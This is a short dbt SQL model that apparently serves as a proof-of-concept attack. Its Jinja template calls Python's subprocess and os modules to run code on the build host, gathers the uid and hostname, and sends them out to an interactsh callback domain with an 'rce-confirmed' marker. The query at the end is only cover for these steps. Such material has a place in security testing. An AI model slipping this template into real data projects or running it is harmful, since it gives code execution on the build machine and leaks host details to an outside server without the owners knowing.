{% set uid = modules.os.getuid().__str__() %}
{% set hostname_bytes = modules.subprocess.check_output(['python3', '-c', 'import socket; print(socket.gethostname())']) %}
{% set hostname = hostname_bytes.decode().strip() %}
{{ log("OOB: sending uid=" ~ uid ~ " hostname=" ~ hostname ~ " to interactsh", info=True) }}
{% set oob = modules.subprocess.check_output(['python3', '-c', 'import urllib.request; urllib.request.urlopen("http://uid-' ~ uid ~ '-host-' ~ hostname ~ '.dbhqjpjkvbtfm3f5n3q0kjkz7r9sfepzh.oast.me/rce-confirmed")']) %}

SELECT 2 as oob_confirmed
